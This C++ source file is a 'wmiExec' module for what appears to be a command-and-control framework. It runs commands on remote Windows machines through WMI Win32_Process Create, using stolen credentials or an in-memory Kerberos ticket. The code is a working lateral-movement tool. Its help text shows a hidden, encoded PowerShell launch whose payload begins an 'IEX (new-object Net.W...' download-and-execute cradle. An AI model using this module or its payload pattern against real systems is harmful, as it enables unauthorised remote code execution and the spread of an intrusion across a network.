#include "WmiExec.hpp"

#include <cstring>
#include  <algorithm>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "wmiExec";
constexpr unsigned long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) WmiExec* WmiExecConstructor() 
{
    return new WmiExec();
}

#endif


WmiExec::WmiExec()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}


WmiExec::~WmiExec()
{
}


std::string WmiExec::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "WmiExec:\n";
	info += "Execute a command through Windows Management Instrumentation (WMI). \n";
    info += "The user have to be administrator of the remote machine. \n";
    info += "Can be use with credentials or with kerberos authentication. \n";
    info += "To use with kerberos, the ticket must be in memory (use Rubeus). \n";
	info += "exemple:\n";
	info += "- wmiExec -u DOMAIN\\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
    info += "- wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
#endif
	return info;
}


int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
   if (splitedCmd.size() >= 5)
	{
		string mode = splitedCmd[1];

        if(mode=="-u")
        {
            string usernameDomain=splitedCmd[2];
            string password=splitedCmd[3];
            string target=splitedCmd[4];
            std::string username="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(usernameDomain, "\\", splitedList);

            if(splitedList.size()==1)
                username = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                username = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += username;
            cmd += '\0';
            cmd += password;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 5; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else if(mode=="-k")
        {
            string dcDomain=splitedCmd[2];
            string target=splitedCmd[3];
            std::string dc="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(dcDomain, "\\", splitedList);

            if(splitedList.size()==1)
                dc = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                dc = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += dc;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 4; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
		    return -1;
        }

        c2Message.set_instruction(splitedCmd[0]);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


// https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--calling-a-provider-method
// https://vimalshekar.github.io/codesamples/Launching-a-process-on-remote-machine
int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    std::string delimitator;
    delimitator+='\0';
    splitList(cmd, delimitator, splitedList);
    
    bool useToken=false;
    std::string authority="";

    bool useNTLM=false;
    std::string target="";
    std::string domainName="";
    std::string userName="";
    std::string user="";
    std::string password="";

    if(splitedList.size()==4)
    {
        useNTLM=true;
        useToken=false;

        domainName=splitedList[0];
        userName=splitedList[1];
        password=splitedList[2];
        target=splitedList[3];

        user=domainName;
        user+="\\";
        user+=userName;

    }
    else if(splitedList.size()==3)
    {
        useNTLM=false;
        useToken=true;

        domainName=splitedList[0];
        std::string dc=splitedList[1];
        target=splitedList[2];

        authority="kerberos:";
        authority+=domainName;
        authority+="\\";
        authority+=dc;
    }
    else
    {

    }


    const std::string data = c2Message.data();

    std::string result;

#ifdef _WIN32

    HRESULT hres;

    hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "CoInitializeEx Failed: ";
        result += errMsg;

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    hres =  CoInitializeSecurity(
        NULL, 
        -1,                          // COM negotiates service
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IDENTIFY,    // Default Impersonation  
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
        );

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();
        
        result += "CoInitializeSecurity Failed: ";
        result += errMsg;
        CoUninitialize();

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }
    
    IWbemLocator * pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator, 
        0, 
        CLSCTX_INPROC_SERVER, 
        IID_IWbemLocator, 
        (LPVOID *) &pLoc);
 
    if (FAILED(hres)) 
    {
        result += "CoCreateInstance Failed: ";
        result += std::to_string(GetLastError());
        CoUninitialize();

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    std::string wmiPath="\\\\";
    wmiPath+=target;
    wmiPath+="\\root\\CIMV2";

    IWbemServices * pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(wmiPath.c_str()), 
                                _bstr_t(useToken?NULL:user.c_str()),        // User name
                                _bstr_t(useToken?NULL:password.c_str()),    // Password
                                NULL,                                       // Locale
                                0L,                                         // Security flags
                                _bstr_t(useNTLM?NULL:authority.c_str()),    // Authority, server principal name
                                0,                                          // WBEM context
                                &pSvc);                                     // Namespace

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "ConnectServer Failed: ";
        result += errMsg;
        pLoc->Release();     
        CoUninitialize();

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cosetproxyblanket
    SEC_WINNT_AUTH_IDENTITY_A* pAuthIdentity = NULL;

    if(useNTLM)
    {
        pAuthIdentity = new SEC_WINNT_AUTH_IDENTITY_A;
        ZeroMemory(pAuthIdentity, sizeof(SEC_WINNT_AUTH_IDENTITY_A));

        pAuthIdentity->User = (unsigned char *)userName.data();
        pAuthIdentity->UserLength = userName.size();

        pAuthIdentity->Domain = (unsigned char *)domainName.data();
        pAuthIdentity->DomainLength = domainName.size();

        pAuthIdentity->Password = (unsigned char *)password.data();
        pAuthIdentity->PasswordLength = password.size();

        pAuthIdentity->Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
    }

    hres = CoSetProxyBlanket(
        pSvc,                                   // Indicates the proxy to set
        RPC_C_AUTHN_DEFAULT,                    // RPC_C_AUTHN_xxx 
        RPC_C_AUTHZ_DEFAULT,                    // RPC_C_AUTHZ_xxx 
        COLE_DEFAULT_PRINCIPAL,                 // Server principal name 
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,          // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE,            // RPC_C_IMP_LEVEL_xxx
        pAuthIdentity,                          // client identity
        EOAC_NONE                               // proxy capabilities 
    );    

    if(useNTLM)
    {
        delete pAuthIdentity;
    }

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "CoSetProxyBlanket Failed: ";
        result += errMsg;
        pSvc->Release();
        pLoc->Release();     
        CoUninitialize();

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    BSTR MethodName = SysAllocString(L"Create");
    BSTR ClassName = SysAllocString(L"Win32_Process");

    IWbemClassObject* pClass = NULL;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);

    if (FAILED(hres)) 
    {
        result += "GetObject Failed: ";
        result += std::to_string((long)(hres)); 
        pLoc->Release();     
        CoUninitialize();
        SysFreeString(ClassName);
        SysFreeString(MethodName);

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    IWbemClassObject* pInParamsDefinition = NULL;
    hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "GetMethod Failed: ";
        result += errMsg;
        pLoc->Release();     
        CoUninitialize();
        SysFreeString(ClassName);
        SysFreeString(MethodName);

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    IWbemClassObject* pClassInstance = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "SpawnInstance Failed: ";
        result += errMsg;
        pLoc->Release();     
        CoUninitialize();
        SysFreeString(ClassName);
        SysFreeString(MethodName);

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(data.c_str());

    hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);

    if (FAILED(hres)) 
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "Put Failed: ";
        result += errMsg;
        pLoc->Release();     
        CoUninitialize();
        SysFreeString(ClassName);
        SysFreeString(MethodName);

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    IWbemClassObject* pOutParams = NULL;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hres))
    {
        _com_error err(hres);
        LPCTSTR errMsg = err.ErrorMessage();

        result += "CoSetProxyBlanket Failed: ";
        result += errMsg;

        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();    

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        cmd += " ";
        cmd += data;
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    VARIANT varReturnValue;
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);

    // TODO print output ?

    // Cleanup
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);
    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pLoc->Release();
    pSvc->Release();
    CoUninitialize();

#elif __linux__

    result += "WmiExec don't work in linux.\n";

#endif

    result += "Success.\n";

    cmd += " ";
    cmd += data;

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(result);
	return 0;
}


#ifdef _WIN32 


#endif
